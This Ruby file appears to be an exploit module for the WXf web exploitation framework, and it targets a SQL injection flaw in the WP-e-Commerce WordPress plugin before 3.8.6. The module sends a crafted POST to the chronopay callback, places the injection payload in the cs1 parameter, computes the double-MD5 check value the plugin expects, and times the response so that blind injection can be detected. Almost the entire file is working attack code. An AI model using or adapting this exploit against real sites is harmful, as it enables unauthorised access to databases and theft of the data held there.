class WebXploit < WXf::WXfmod_Factory::Exploit
  include WXf::WXfassists::General::MechReq
require 'digest/md5'

def initialize
  super(
   'Name'        => 'Wp-Commerce SQL',
   'Version'     => '1.0',
   'Description' => %q{
 	SQL Injection exploit for WP-Commerce < 3.8.6
                    },
   'Author'      => [ 'Miroslav Stampar, John M. Poulin' ],
   'License'     => WXF_LICENSE,
   'Payload'     => true
  )

  init_opts([
  	OptString.new('HTTP_USER', [false, "HTTP Username", ""]),
	OptString.new('HTTP_PASS', [false, "HTTP Password", ""]),
  ])

end

def exploit
	# Prepare Payload Hash
	cs3=Digest::MD5.hexdigest(Digest::MD5.hexdigest(CGI::unescape(payload.payload_data)))
	params = "chronopay_callback=true&cs2=chronopay&cs1=#{payload.payload_data}&cs3=#{cs3}&transaction_type=rebill"
 	#mod_params = convert_params("#{params}")

	# Find starting timestamp
	start_time = Time.new.to_i

	puts  res = mech_req({
                    'method'=> 'POST',
                    'RURL'  =>  "#{rurl}",
                    'RPARAMS' => params
                  })  

	# Find Ending Timestamp
	end_time = Time.new.to_i

	if res and res.respond_to?('code')
		if res.code == "200"
			puts "The script has taken " + (end_time - start_time).to_s + "seconds to execute"
		elsif res.code == "401" 
			puts "We've received a 401"
		elsif res.code == "403"
			puts "We've received a 403"
		end
	end

end

end
